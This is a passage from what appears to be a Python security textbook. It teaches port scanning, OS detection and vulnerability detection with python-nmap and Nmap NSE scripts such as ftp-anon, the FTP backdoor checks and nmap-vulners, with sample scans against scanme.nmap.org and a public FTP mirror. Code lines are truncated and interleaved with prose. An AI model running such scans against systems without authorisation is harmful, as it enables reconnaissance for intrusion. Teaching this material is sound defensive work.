Filtered: This indicates that no packets were received, and the
state could not be established.
Unﬁltered: This indicates that packets were received but a state
could not be established.
In conclusion, the python-nmap module emerged as the main
module for performing these types of tasks. This module helps to
manipulate the scanned results of Nmap programmatically to
automate port-scanning tasks.
Port scanning with python-nmap

In this section, we will review the python-nmap module for port
scanning in Python. We will learn how the python-nmap module
uses Nmap and how it is a very useful tool for optimizing tasks
regarding discovery services in a speciﬁc target, domain, network, or
IP address.
python-nmap is a tool whose main functionality is to discover what
ports or services a speciﬁc host has open for listening. Also, it can be
a perfect tool for system administrators or computer security
consultants when it comes to automating penetration-testing
processes and network troubleshooting.
In addition to being able to scan hosts and ports of a given network
segment, it also oﬀers the possibility of knowing which version of a
given service, such as SSH or FTP, is being used by the target
machine. It also allows us to run advanced scripts thanks to the
Nmap Scripting Engine (NSE) to automate diﬀerent types of aĴacks
or detect vulnerable services on the target machine.
You can access the source code of the project in the following
repository: https://bitbucket.org/xael/python-
nmap/src/master. Also, you can ﬁnd documentation about the
project at the following URL: https://xael.org/pages/python-
nmap-en.html.
Now, you can import the python-nmap module to get the nmap
version and classes available in this module. With the following
commands, we are invoking the Python interpreter to review the
various methods and functions python-nmap has to oﬀer:

Once we have veriﬁed the installation, we can start scanning on a
speciﬁc host. We need to instantiate an object of the PortScanner
class so we can access the scan() method. A good practice for
understanding how a process, method, or object works is to use the
dir() method to ﬁnd out the methods available in this class:
In the preceding output, we can see the properties and methods
available in the PortScanner class we can use when instantiating an
object of this class. With the help command, we can obtain
information about the scan() method.
If we execute the help(port_scan.scan) command, we can see the
scan method from the PortScanner class receives three arguments,
the host(s), the ports, and the arguments related to the scanning
type:
>>> import nmap 
>>> nmap.__version__ 
'0.7.1' 
>>> dir(nmap) 
['ET', 'PortScanner', 'PortScannerAsync', 'PortScann
>>> port_scan = nmap.PortScanner() 
>>> dir(port_scan) 
['_PortScanner__process', '__class__', '__delattr__

At this point we could execute our ﬁrst scan with the scan('ip',
'ports') method, where the ﬁrst parameter is the IP address, the
second is a port list, and the third, which is optional, is the scanning
options. In the following example, a scan is performed on the
scanme.nmap.org domain on ports in the 22-443 range. With the -
sV argument, we are executing nmap to detect services and versions
when invoking scanning:
>>> help(port_scan.scan) 
Help on method scan in module nmap.nmap: 
scan(hosts='127.0.0.1', ports=None, arguments='-sV',
    Scan given hosts 
    May raise PortScannerError exception if nmap out
    Test existance of the following key to know 
    if something went wrong : ['nmap']['scaninfo'][
    If not present, everything was ok. 
    :param hosts: string for hosts as nmap use it 's
    :param ports: string for ports as nmap use it '2
    :param arguments: string of arguments for nmap 
    :param sudo: launch nmap with sudo if True 
    :returns: scan_result as dictionary 
>>> portScanner = nmap.PortScanner() 
>>> results = portScanner.scan('scanme.nmap.org', '2
>>> results 
{'nmap': {'command_line': 'nmap -oX - -p 22-443 -sV 
ack', 'name': 'ssh', 'product': 'OpenSSH', 'version

The previous output returns that the target we are scanning has the
Ubuntu operating system, the IP address is 45.33.32.156, and it
has ports 22 and 80 open.
Extracting information with nmap
Nmap provides functions to extract information more eﬃciently. For
example, we may obtain information about host names, IP
addresses, scan results, protocols, and host status:
With the command_line() method, we can see the nmap command
that has been executed with the nmap tool:
>>> portScanner.command_line() 
'nmap -oX - -p 22-443 -sV scanme.nmap.org' 
>>> portScanner.all_hosts() 
['45.33.32.156'] 
>>> portScanner.scaninfo() 
{'tcp': {'method': 'connect', 'services': '22-443'}}
>>> portScanner['45.33.32.156'].all_protocols() 
['tcp'] 
>>> portScanner['45.33.32.156'].hostnames() 
[{'name': 'scanme.nmap.org', 'type': 'user'}, {'name
>>> portScanner['45.33.32.156'].state() 
'up' 

Nmap provides an --open option to display open ports, so you can
include it as follows:
We could also get all this data in a more readable format through the
csv() method.
The following script tries to perform a scan with python-nmap with
the following conditions in the arguments:
Scanning ports list: 21, 22, 23, 25, 80
The -n option in the scan method for not applying a DNS
resolution
You can ﬁnd the following code in the Nmap_port_scanner.py ﬁle:
>>> portScanner.scan('scanme.nmap.org','21,22,80,443
{'nmap': {'command_line': 'nmap -oX - -p 21,22,80,44
>>> portScanner.csv() 
'host;hostname;hostname_type;protocol;port;name;stat
import nmap 
portScanner = nmap.PortScanner() 
host_scan = input('Host scan: ') 
portlist="21,22,23,25,80" 
portScanner.scan(hosts=host_scan, arguments='-n -p'+
print(portScanner.command_line()) 
hosts_list = [(x, portScanner[x]['status']['state'])

In the previous script, we are using the all_protocols() method
to analyze each protocol found in the portScanner results. We
continue with the script execution:
$ python Nmap_port_scanner.py 
Host scan: scanme.nmap.org 
nmap -oX - -n -p21,22,23,25,80 scanme.nmap.org 
45.33.32.156 up 
Protocol : tcp 
Port : 21 State : closed 
Port : 22 State : open 
Port : 23 State : closed 
Port : 25 State : closed 
Port : 80 State : open 
In the previous output, we can see the state of the ports we are
analyzing. Similarly, we could perform the scan by specifying a
domain name and indicating a port range. You can ﬁnd the
following code in the PortScannerRange.py ﬁle:
for host, status in hosts_list: 
    print(host, status) 
for protocol in portScanner[host].all_protocols(): 
    print('Protocol : %s' % protocol) 
    listport = portScanner[host]['tcp'].keys() 
    for port in listport: 
        print('Port : %s State : %s' % (port,portSca

When running the above script, we can use the domain name to
perform the scan and the port range we are interested in analyzing.
import nmap  
import socket 
print("-----------" * 6) 
print('          Scanner with Nmap: ') 
print("-----------" * 6) 
domain = input ('Domain: ') 
port_range = input ('Port range: ') 
ip_address = socket.gethostbyname(domain) 
print("-----------" * 6) 
print("         Scanning the host with ip address: "
print("-----------" * 6) 
nm = nmap.PortScanner() 
nm.scan(ip_address, port_range) 
for host in nm.all_hosts(): 
    print("     Host : %s (%s)" % (host,ip_address))
    print("     State : %s" % nm[host].state()) 
    for protocol in nm[host].all_protocols(): 
        print("-----------" * 6) 
        print("     Protocols : %s" % protocol) 
        lport = nm[host][protocol].keys() 
        for port in lport: 
            print("     Port : %s \t State : %s" %(p
$ python PortScannerRange.py 
----------------------------------------------------
          Scanner with Nmap:  
----------------------------------------------------

Now that you know how to use python-nmap to execute a scan of a
speciﬁc port list, let’s move on to learning about the diﬀerent modes
of scanning with this module.
Synchronous and asynchronous
scanning with python-nmap
Domain: scanme.nmap.org 
Port range: 70-80 
----------------------------------------------------
         Scanning the host with ip address: 45.33.32
----------------------------------------------------
     Host : 45.33.32.156 (45.33.32.156) 
     State : up 
----------------------------------------------------
     Protocols : tcp 
     Port : 70    State : closed 
     Port : 71    State : closed 
     Port : 72    State : closed 
     Port : 73    State : closed 
     Port : 74    State : closed 
     Port : 75    State : closed 
     Port : 76    State : closed 
     Port : 77    State : closed 
     Port : 78    State : closed 
     Port : 79    State : closed 
     Port : 80    State : open 

In this section, we will review the scan modes supported in the
python-nmap module. This module allows the automation of port
scanner tasks and can perform scans in two ways, synchronously
and asynchronously:
With synchronous mode, every time scanning is done on one
port, it has to ﬁnish to proceed with the next port.
With asynchronous mode, we can perform scans on diﬀerent
ports simultaneously and we can deﬁne a callback function that
will execute when a scan is ﬁnished on a speciﬁc port. Inside
this function, we can perform additional operations such as
checking the state of the port or launching an Nmap script for a
speciﬁc service (HTTP, FTP, or MySQL).
Let’s go over these modes one by one in more detail and try to
implement them.
Implementing synchronous scanning
In the following example, we are implementing an NmapScanner
class that allows us to scan an IP address and a list of ports that are
passed as a parameter. You can ﬁnd the following code in the
NmapScanner.py ﬁle:
import optparse 
import nmap 
class NmapScanner: 
    def __init__(self): 
        self.portScanner = nmap.PortScanner() 
    def nmapScan(self, ip_address, port): 

In the previous code, we are adding the necessary conﬁguration for
managing the input parameters. We perform a loop that processes
each port sent by the parameter and call the nmapScan(ip, port)
method of the NmapScanner class. The next part of the following
code represents our main function for managing the script
arguments:
With the -h option, we can see the options are being accepted by the
script:
        self.portScanner.scan(ip_address, port) 
        self.state = self.portScanner[ip_address]['t
        print(" [+] Executing command: ", self.portS
        print(" [+] "+ ip_address + " tcp/" + port +
def main(): 
    parser = optparse.OptionParser("usage%prog " + "
    parser.add_option('--ip_address', dest = 'ip_add
    parser.add_option('--ports', dest = 'ports', typ
    (options, args) = parser.parse_args() 
    if (options.ip_address == None) | (options.ports
        print('[-] You must specify a target ip_addr
        exit(0) 
    ip_address = options.ip_address 
    ports = options.ports.split(',') 
    for port in ports: 
        NmapScanner().nmapScan(ip_address, port) 
if __name__ == "__main__": 
    main() 

This could be the output if we execute the previous script with the
host 45.33.32.156 corresponding to the scanme.nmap.org
domain and ports 21, 22, 23, 25, 80:
In addition to performing port scanning and returning the result to
the console, we could output the results in CSV format. You can ﬁnd
the following code in the NmapScannerCSV.py ﬁle:
$ python NmapScanner.py -h 
Usage: usageNmapScanner.py --ip_address <target ip a
Options: 
  -h, --help            show this help message and e
  --ip_address=IP_ADDRESS 
                        Please, specify the target i
  --ports=PORTS         Please, specify the target p
$ python NmapScanner.py --ip_address 45.33.32.156 --
[+] Executing command:  nmap -oX - -p 21 -sV 45.33.3
[+] 45.33.32.156 tcp/21 closed 
[+] Executing command:  nmap -oX - -p 22 -sV 45.33.3
[+] 45.33.32.156 tcp/22 open 
[+] Executing command:  nmap -oX - -p 23 -sV 45.33.3
[+] 45.33.32.156 tcp/23 closed 
[+] Executing command:  nmap -oX - -p 25 -sV 45.33.3
[+] 45.33.32.156 tcp/25 closed 
[+] Executing command:  nmap -oX - -p 80 -sV 45.33.3
[+] 45.33.32.156 tcp/80 open 

In the ﬁrst part of the preceding code, we are using the csv()
method from the portScanner object, which returns scan results in
an easy format to collect the information. The idea is to get each CSV
import optparse 
import nmap 
import csv 
class NmapScannerCSV: 
    def __init__(self): 
        self.portScanner = nmap.PortScanner() 
    def nmapScanCSV(self, host, ports): 
        try: 
            print("Checking ports "+ str(ports) +" 
            self.portScanner.scan(host, arguments='-
            print("[*] Executing command: %s" % self
            print(self.portScanner.csv()) 
            print("Summary for host",host) 
            with open('csv_file.csv', mode='w') as c
                csv_writer = csv.writer(csv_file, de
                csv_writer.writerow(['Host', 'Protoc
                for x in self.portScanner.csv().spli
                    splited_line = x.split(";") 
                    host = splited_line[0] 
                    protocol = splited_line[5] 
                    port = splited_line[4] 
                    state = splited_line[6] 
                    print("Protocol:",protocol,"Port
                    csv_writer.writerow([host, proto
        except Exception as exception: 
            print("Error to connect with " + host + 

line to obtain information about the host, protocol, port, and state.
The next part of the following code represents our main function for
managing the script arguments:
In the main function, we are managing the arguments used by the
script and we are calling the nmapScanCSV(host,ports) method,
passing the IP address and port list as parameters. In the following
output, we can see the execution of the previous script:
def main(): 
    parser = optparse.OptionParser("usage%prog " + "
    parser.add_option('--host', dest = 'host', type 
    parser.add_option('--ports', dest = 'ports', typ
    (options, args) = parser.parse_args() 
    if (options.host == None) | (options.ports == No
        print('[-] You must specify a target host an
        exit(0) 
    host = options.host 
    ports = options.ports 
    NmapScannerCSV().nmapScanCSV(host,ports) 
if __name__ == "__main__": 
    main() 
$ python NmapScannerCSV.py --host 45.33.32.156 --por
Checking ports 21,22,23,25,80 .......... 
[*] Executing command: nmap -oX - -n -p21,22,23,25,8
host;hostname;hostname_type;protocol;port;name;state
45.33.32.156;;;tcp;21;ftp;closed;;;conn-refused;;3; 
45.33.32.156;;;tcp;22;ssh;open;;;syn-ack;;3; 

In the previous output, we can see the nmap command that is
executing and the port states in CSV format. For each CSV line, it
shows information about the host, protocol, port, state, and extra
information related to the port state. For example, if the port is
closed, it shows the conn-refused text and if the port is open, it
shows syn-ack. Finally, we print a summary for the host based on
the information extracted from the CSV.
In the following example, we are using the nmap command to detect
ports that are open and obtain information about the operating
system. You can ﬁnd the following code in the
nmap_operating_system.py ﬁle:
45.33.32.156;;;tcp;23;telnet;closed;;;conn-refused;;
45.33.32.156;;;tcp;25;smtp;closed;;;conn-refused;;3;
45.33.32.156;;;tcp;80;http;open;;;syn-ack;;3; 
Summary for host 45.33.32.156 
Protocol: ftp Port: 21 State: closed 
Protocol: ssh Port: 22 State: open 
Protocol: telnet Port: 23 State: closed 
Protocol: smtp Port: 25 State: closed 
Protocol: http Port: 80 State: open 
import nmap, sys 
command="nmap_operating_system.py  <IP_address>"
if len(sys.argv) == 1: 
    print(command) 
    sys.exit() 
host = sys.argv[1] 
portScanner = nmap.PortScanner() 

In the previous script, we are using the scan() method from the
portScanner object, using as an argument the -O ﬂag to detect the
operating system when executing the scan. To get information about
operating system details, we need access to the portScanner[host]
dictionary that contains this information in the osmatch key. In the
following output, we can see the execution of the previous script:
open_ports_dict =  portScanner.scan(host, arguments=
if open_ports_dict is not None: 
    open_ports_dict = open_ports_dict.get("scan").ge
    print("Open port-->Service") 
    port_list = open_ports_dict.keys() 
    for port in port_list: 
        print(port, "-->",open_ports_dict.get(port)[
    print("\n--------------Operating System details-
    print("Details about the scanned host are: \t", 
    print("Operating system family is: \t\t", portSc
    print("Type of OS is: \t\t\t\t", portScanner[hos
    print("Generation of Operating System :\t", port
    print("Operating System Vendor is:\t\t", portSca
    print("Accuracy of detection is:\t\t", portScann
$ sudo python nmap_operating_system.py 45.33.32.156 
Open port-->Service 
22 --> ssh 
80 --> http 
9929 --> nping-echo 
31337 --> Elite 
  
--------------Operating System details--------------

In the previous output, we can see information related to open ports
and the details about the operating system on the 45.33.32.156
machine.
To execute the previous script, sudo is required due
to the need for raw socket access. You may receive the
following message when you start the scanning
process: You requested a scan type which requires
root privileges. QUITTING! If you do, you need to
execute the command with sudo for Unix operating
systems.
Now that you know how to use synchronous scanning with
python-nmap, let’s move on to explain asynchronous mode
scanning for executing many commands at the same time.
Implementing asynchronous scanning
Although the PortScanner class is the most frequently used, it is
also possible to run the scan in the background while the script
  
Details about the scanned host are:    ['cpe:/o:linu
Operating system family is:            Linux 
Type of OS is:                         general purpo
Generation of Operating System :       5.X 
Operating System Vendor is:            Linux 
Accuracy of detection is:              95 

performs other activities. This is achieved with the
PortScannerAsync class:
In the following example, when performing the scan, we can specify
an additional callback parameter where we deﬁne the return
function, which would be executed at the end of the scan. You can
ﬁnd the following code in the PortScannerAsync.py ﬁle:
>>> def nmap_callback(host,result): 
...     print(result) 
...  
>>> nma = nmap.PortScannerAsync() 
>>> nma.scan('scanme.nmap.org',arguments="-Pn",callb
>>> nma.still_scanning() 
True 
>>> {'nmap': {'command_line': 'nmap -oX - -Pn 45.33
import nmap 
portScannerAsync = nmap.PortScannerAsync() 
def callback_result(host, scan_result): 
    print(host, scan_result) 
portScannerAsync.scan(hosts='scanme.nmap.org', argum
portScannerAsync.scan(hosts='scanme.nmap.org', argum
portScannerAsync.scan(hosts='scanme.nmap.org', argum
portScannerAsync.scan(hosts='scanme.nmap.org', argum
while portScannerAsync.still_scanning(): 
    print("Scanning >>>") 
    portScannerAsync.wait(5) 

In the previous script, we deﬁned a callback_result() function,
which is executed when Nmap ﬁnishes the scanning process with
the arguments speciﬁed. The while loop deﬁned is executed while
the scanning process is still in progress. This could be the output of
the execution:
In the previous output, we can see that the results for each port are
not necessarily returned in sequential order. In the following
example, we are implementing an NmapScannerAsync class, which
allows us to execute an asynchronous scan with an IP address and a
list of ports that are passed as parameters. You can ﬁnd the following
code in the NmapScannerAsync.py ﬁle:
$ python PortScannerAsync.py 
Scanning >>> 
45.33.32.156 {'nmap': {'command_line': 'nmap -oX - -
45.33.32.156 {'nmap': {'command_line': 'nmap -oX - -
import nmap 
import argparse 
def callbackResult(host, scan_result): 
    #print(host, scan_result) 
    port_state = scan_result['scan'][host]['tcp'] 
    print("Command line:"+ scan_result['nmap']['comm
    for key, value in port_state.items(): 
        print('Port {0} --> {1}'.format(key, value))

In the previous code, we deﬁned a callback_result() method
that is executed when Nmap ﬁnishes the scanning process. This
function shows information about the command executed and the
state for each port we are analyzing.
In the following code, we are implementing the NmapScannerAsync
class, which contains the init method constructor for initializing
portScannerAsync, the scanning() method that we are calling
during the scanning process, and the nmapScanAsync() method,
which contains the scanning process:
In the previous code, we can see the nmapScanAsync(self,
hostname, port) method inside the NmapScannerAsync class,
class NmapScannerAsync: 
    def __init__(self): 
        self.portScannerAsync = nmap.PortScannerAsyn
    def scanning(self): 
        while self.portScannerAsync.still_scanning()
            print("Scanning >>>") 
            self.portScannerAsync.wait(5) 
    def nmapScanAsync(self, hostname, port): 
        try: 
            print("Checking port "+ port +" .......
            self.portScannerAsync.scan(hostname, arg
            self.scanning() 
        except Exception as exception: 
            print("Error to connect with " + hostnam

which checks each port passed as a parameter and calls the
callbackResult function when ﬁnishing the scan over this port.
The following code represents our main program that requests host
and ports as parameters and calls the nmapScanAsync(host,port)
function for each port the user has introduced for scanning:
Now we can execute the NmapScannerAsync.py script with the
following host and ports parameters:
if __name__ == "__main__": 
    parser = argparse.ArgumentParser(description='As
    parser.add_argument("--host", dest="host", help=
    parser.add_argument("-ports", dest="ports", help
    parsed_args = parser.parse_args() 
    port_list = parsed_args.ports.split(',') 
    host = parsed_args.host 
    for port in port_list: 
        NmapScannerAsync().nmapScanAsync(host, port)
$ python NmapScannerAsync.py --host scanme.nmap.org 
Checking port 21 .......... 
Checking port 22 .......... 
Scanning >>> 
Scanning >>> 
Command line:nmap -oX - -A -sV -p22 45.33.32.156 
Port 22 --> {'state': 'open', 'reason': 'syn-ack', 
Checking port 23 .......... 
Checking port 25 .......... 
Scanning >>> 

As a result of the previous execution, we can see the process has
analyzed the ports that have been passed by parameter and for each
scanned port it shows information about the command executed and
the result in dictionary format. For example, it returns that ports 22
and 80 are open, and in the extrainfo property returned in the
dictionary, you can see information related to the server that is
executing the service in each port.
The main advantage of using async is that the results of scanning
are not necessarily returned in the same order in which we have
launched the port scanning and we cannot expect the results to come
in the same order as when we do a synchronous scan.
In addition to the PortScanner and PortScannerAsync classes,
there is another class that allows you to execute scans with Nmap, in
this case in a progressive way. The PortScannerYield class
provides the capacity to execute the Nmap scan and return each
result that the tool generates. This can be useful when analyzing a
complete network environment and you do not want to wait until
the scan is ﬁnished to see results, but rather to see them
progressively as Nmap generates information.
Command line:nmap -oX - -A -sV -p25 45.33.32.156 
Port 25 --> {'state': 'closed', 'reason': 'conn-refu
Checking port 80 .......... 
Scanning >>> 
Command line:nmap -oX - -A -sV -p80 45.33.32.156 
Port 80 --> {'state': 'open', 'reason': 'syn-ack', 

Now that you know how to use the diﬀerent scan modes with
python-nmap, let’s move on to explain how we can execute nmap to
discover services and vulnerabilities.
Discovering services and
vulnerabilities with Nmap scripts
In this section, we will learn how to discover services as well as
perform advanced operations to collect information about a target
and detect vulnerabilities in the FTP service.
Executing Nmap scripts to discover
services
Nmap is an exceptional tool for performing network and service
scans, but among its numerous features there are some very notable
ones, such as the Nmap Scripting Engine (NSE).
Nmap lets you perform vulnerability scans thanks to its powerful
Lua scripting engine. In this way, we can also run more complex
routines that let us ﬁlter information about a speciﬁc target.
>>> nmy = nmap.PortScannerYield() 
>>> for progress in nmy.scan('scanme.nmap.org',argum
...     print(progress) 
...' 
('45.33.32.156', {'nmap': {'command_line': 'nmap -oX

Nmap provides several scripts that can help to identify services with
the possibility to exploit found vulnerabilities. Each of these scripts
can be called using the –script option:
Auth: Executes all available scripts for authentication
Default: Executes the basic scripts of the tool by default
Discovery: Retrieves information from the target or victim
External: A script to use external resources
Intrusive: Uses scripts that are considered intrusive to the
victim or target
Malware: Checks whether there are connections opened by
malicious code or backdoors
Safe: Executes scripts that are not intrusive
Vuln: Discovers the most well-known vulnerabilities
All: Executes absolutely all scripts with the NSE extension
available
On Unix operating systems scripts are typically found in the
/usr/share/nmap/scripts path. These scripts allow programming
routines to ﬁnd possible vulnerabilities in a given host. The scripts
available can be found at https://nmap.org/nsedoc/scripts.
In the following example, we are executing the nmap command with
the --script option for banner grabbing (banner), which gets
information about the services that are running in the server:
$ sudo nmap -sSV --script=banner scanme.nmap.org 
Nmap scan report for scanme.nmap.org (45.33.32.156) 
Host is up (0.18s latency). 
Other addresses for scanme.nmap.org (not scanned): 2

In the output of the previous command, we can see the ports that are
open, and for each port, it returns information about the version of
the service and the operating system that is running. Another
interesting script that Nmap incorporates is discovery, which allows
us to know more information about the services that are running on
the server we are analyzing.
The discovery category includes diﬀerent scripts. We can ﬁnd out
about them with the following URL:
https://nmap.org/nsedoc/categories/discovery.html.
Not shown: 961 closed ports, 33 filtered ports 
PORT      STATE SERVICE    VERSION 
22/tcp    open  ssh        OpenSSH 6.6.1p1 Ubuntu 2u
|_banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
80/tcp    open  http       Apache httpd 2.4.7 ((Ubun
|_http-server-header: Apache/2.4.7 (Ubuntu) 
2000/tcp  open  tcpwrapped 
5060/tcp  open  tcpwrapped 
9929/tcp  open  nping-echo Nping echo 
| banner: \x01\x01\x00\x18>\x95}\xA4_\x18d\xED\x00\x
|_6s\x97%\x17\xC2\x81\x01\xA5R\xF7\x89\xF4x\x02\xBAm
31337/tcp open  tcpwrapped 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_ker
$ sudo nmap  --script discovery scanme.nmap.org 
Pre-scan script results: 
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter 
Nmap scan report for scanme.nmap.org (45.33.32.156) 

In the output of the discovery command, we can see how it is
executing a dns-brute process to obtain information about
subdomains and their IP addresses.
If we are interested in a speciﬁc script from the discovery category,
we could execute the following:
$ sudo nmap --script dns-brute scanme.nmap.org 
We could also use the nmap scripts to get more information related
to the public key, as well as the encryption algorithms supported by
the server on SSH port 22:
Host is up (0.17s latency). 
Other addresses for scanme.nmap.org (not scanned): 2
All 1000 scanned ports on scanme.nmap.org (45.33.32
Host script results: 
| asn-query: 
| BGP: 45.33.32.0/24 and 45.33.32.0/19 | Country: US
|   Origin AS: 63949 - LINODE-AP Linode, LLC, US 
|_    Peer AS: 1299 2914 3257 
| dns-brute: 
|   DNS Brute-force hostnames: 
|     ipv6.nmap.org - 2600:3c01:0:0:f03c:91ff:fe70:d
|     chat.nmap.org - 45.33.32.156 
|     chat.nmap.org - 2600:3c01:0:0:f03c:91ff:fe18:b
|     *AAAA: 2600:3c01:0:0:f03c:91ff:fe98:ff4e 
|_    *A: 45.33.49.119 
… 

$ sudo nmap -sSV -p22 --script ssh-hostkey scanme.nm
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
| ssh-hostkey: 
|   1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6
|   2048 20:3d:2d:44:62:2a:b0:5a:9d:b5:b3:05:14:c2:a
|   256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2
|_  256 33:fa:91:0f:e0:e1:7b:1f:6d:05:a2:b0:f1:54:41
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_ker
$ sudo nmap -sSV -p22 --script ssh2-enum-algos scanm
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
| ssh2-enum-algos: 
|   kex_algorithms: (8) 
|       curve25519-sha256@libssh.org 
|       ecdh-sha2-nistp256 
|       ecdh-sha2-nistp384 
|       ecdh-sha2-nistp521 
|       diffie-hellman-group-exchange-sha256 
|       diffie-hellman-group-exchange-sha1 
|       diffie-hellman-group14-sha1 
|       diffie-hellman-group1-sha1 
|   server_host_key_algorithms: (4) 
|       ssh-rsa 
|       ssh-dss 
|       ecdsa-sha2-nistp256 
|       ssh-ed25519 
... 

As a result of the execution, we can see the information related to the
algorithms supported by the SSH server located on the
scanme.nmap.org domain on port 22.
Now that you know how to use nmap scripts for discovery and get
more information about speciﬁc services, let’s move on to executing
Nmap scripts to discover vulnerabilities.
Executing Nmap scripts to discover
vulnerabilities
Nmap provides some scripts for detecting vulnerabilities in the FTP
service on port 21. For example, we can use the ftp-anon script to
detect whether the FTP service allows authentication anonymously
without having to enter a username and password. In the following
example, we see how an anonymous connection is possible on the
FTP server:
$ sudo nmap -sSV -p21 --script ftp-anon ftp.be.debia
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     ProFTPD 
| ftp-anon: Anonymous FTP login allowed (FTP code 23
| lrwxrwxrwx   1 ftp      ftp            16 May 14  
| drwxr-xr-x   9 ftp      ftp          4096 Jul 22 1
| drwxr-sr-x   5 ftp      ftp          4096 Mar 13  
| drwxr-xr-x   5 ftp      ftp          4096 Jul 19 0
| drwxr-xr-x   7 ftp      ftp          4096 Jul 22 1
| drwxr-sr-x   5 ftp      ftp          4096 Jan  5  
| drwxr-xr-x   5 ftp      ftp          4096 Oct 13  
| -rw-r--r--   1 ftp      ftp           419 Nov 17  
|

In the following script, we will asynchronously query the scripts
deﬁned for the FTP service, and each time a response is received, the
callbackFTP function will be executed, giving us more information
about this service. You can ﬁnd the following code in the
NmapScannerAsyncFTP.py ﬁle:
| drwxr-xr-x  10 ftp      ftp          4096 Jul 22 1
| drwxr-xr-x  20 ftp      ftp          4096 Jul 22 1
|_-rw-r--r--   1 ftp      ftp           377 Nov 17  
import nmap 
import argparse 
def callbackFTP(host, result): 
    try: 
        script = result['scan'][host]['tcp'][21]['sc
        print("Command line"+ result['nmap']['comman
        for key, value in script.items(): 
            print('Script {0} --> {1}'.format(key, v
    except KeyError: 
        pass
class NmapScannerAsyncFTP: 
    def __init__(self): 
        self.portScanner = nmap.PortScanner() 
        self.portScannerAsync = nmap.PortScannerAsyn
    def scanning(self): 
        while self.portScannerAsync.still_scanning()
            print("Scanning >>>") 
            self.portScannerAsync.wait(10) 

In the previous code, we deﬁned the callbackFTP function, which
is executed when the nmap scan process ﬁnishes for a speciﬁc script.
The following method checks the port passed as a parameter and
launches Nmap scripts related to FTP asynchronously. If it detects
that it has port 21 open, then we would run the nmap scripts
corresponding to the FTP service:
In the ﬁrst part of the preceding code, we are asynchronously
executing scripts related to detecting vulnerabilities in the ftp
service. We start checking the anonymous login in the FTP server
with the ftp-anon.nse script.
In the next part of the code, we continue executing other scripts such
as ftp-bounce.nse, ftp-libopie.nse, ftp-proftpd-
backdoor.nse, and ftp-vsftpd-backdoor.nse, which allow
    def nmapScanAsync(self, hostname, port): 
        try: 
            print("Checking port "+ port +" .......
            self.portScanner.scan(hostname, port) 
            self.state = self.portScanner[hostname]
            print(" [+] "+ hostname + " tcp/" + port
            #checking FTP service 
            if (port=='21') and self.portScanner[hos
                print('Checking ftp port with nmap s
                print('Checking ftp-anon.nse .....')
                self.portScannerAsync.scan(hostname,
                self.scanning() 

testing speciﬁc vulnerabilities depending on the version of the ftp
service:
This can be the execution of the previous script where we are testing
the IP address for the ftp.be.debian.org domain:
                print('Checking ftp-bounce.nse  ...
                self.portScannerAsync.scan(hostname,
                self.scanning() 
                print('Checking ftp-libopie.nse  ..
                self.portScannerAsync.scan(hostname,
                self.scanning() 
                print('Checking ftp-proftpd-backdoor
                self.portScannerAsync.scan(hostname,
                self.scanning() 
                print('Checking ftp-vsftpd-backdoor
                self.portScannerAsync.scan(hostname,
                self.scanning() 
        except Exception as exception: 
            print("Error to connect with " + hostnam
$ python NmapScannerAsyncFTP.py --host 195.234.45.11
Checking port 21 .......... 
[+] 195.234.45.114 tcp/21 open 
Checking ftp port with nmap scripts...... 
Checking ftp-anon.nse ..... 
Scanning >>> 
Scanning >>> 
Command linenmap -oX - -A -sV -p21 --script ftp-anon

As a result of the execution, we can see the information related to
port 21 and the execution of the nmap scripts related to the ftp
service. The information returned by executing them could be used
in a post-exploitation phase or exploit discovery process for the
service we are testing.
Now that you know how to use the nmap module to detect services
and vulnerabilities, let’s move on to discovering vulnerabilities with
the nmap-vulners script.
Detecting vulnerabilities with Nmap-
vulners script
One of the most well-known vulnerability scanners is Nmap-
vulners. Let’s look at how to set up this tool as well as how to run a
basic CVE scan. The NSE searches HTTP responses to identify CPEs
Script ftp-anon --> Anonymous FTP login allowed (FTP
lrwxrwxrwx   1 ftp      ftp            16 May 14  20
drwxr-xr-x   9 ftp      ftp          4096 Oct  1 14
drwxr-sr-x   5 ftp      ftp          4096 Mar 13  20
drwxr-xr-x   5 ftp      ftp          4096 Sep 27 06
drwxr-xr-x   7 ftp      ftp          4096 Oct  1 16
drwxr-sr-x   5 ftp      ftp          4096 Jan  5  20
drwxr-xr-x   5 ftp      ftp          4096 Oct 13  20
-rw-r--r--   1 ftp      ftp           419 Nov 17  20
drwxr-xr-x  10 ftp      ftp          4096 Oct  1 16
drwxr-xr-x  20 ftp      ftp          4096 Oct  1 17
-rw-r--r--   1 ftp      ftp           377 Nov 17  20
Checking ftp-bounce.nse  ..... 

for the given script. First, we download the source code from the
GitHub repository.
Then we have to copy the downloaded ﬁles into the folder where the
nmap scripts are stored. In the case of a Linux based operating
system, they are usually located in the path
/usr/share/nmap/scripts/:
The reader is encouraged to review the README ﬁle found in the
repository for operating system speciﬁc instructions.
In this way, we would be able to execute the vulners script with the
following command:
$ git clone https://github.com/vulnersCom/nmap-vulne
$ sudo mv /home/linux/Downloads/nmap-vulners-master/
$ nmap -sV --script vulners scanme.nmap.org -p22,80,
PORT     STATE  SERVICE VERSION 
22/tcp   open   ssh     OpenSSH 6.6.1p1 Ubuntu 2ubun
| vulners:  
|   cpe:/a:openbsd:openssh:6.6.1p1:  
|        CVE-2015-5600   8.5    https://vulners.com/
|        CVE-2015-6564   6.9    https://vulners.com/
|        CVE-2018-15919  5.0    https://vulners.com/
|        CVE-2021-41617  4.4    https://vulners.com/
|        CVE-2020-14145  4.3    https://vulners.com/
|

All the execution logic of the vulners script is in the vulners.nse
ﬁle, which is in the https://github.com/vulnersCom/nmap-
vulners/blob/master/vulners.nse repository and copied to the
nmap scripts folder. We could write a Python script that executes
the previous command to get the output of the command using the
communicate() method. You can ﬁnd the following code in the
nmap_vulners.py ﬁle:
|        CVE-2015-5352   4.3    https://vulners.com/
|_       CVE-2015-6563   1.9    https://vulners.com/
80/tcp   open   http    Apache httpd 2.4.7 ((Ubuntu)
